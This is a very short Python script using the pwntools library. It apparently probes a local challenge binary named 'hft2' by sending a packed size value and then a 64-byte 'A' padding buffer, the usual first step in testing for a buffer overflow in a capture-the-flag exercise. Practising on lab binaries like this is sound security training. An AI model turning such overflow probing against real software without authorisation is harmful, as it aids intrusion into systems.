from pwn import *

p = process(["./hft2"])
print(p.recvline())
print(p.recvline())
p.send(p64(32))
# p.sendline(p64(1))
p.sendline(p64(1) + b"A" * 64)
print(p.recvline())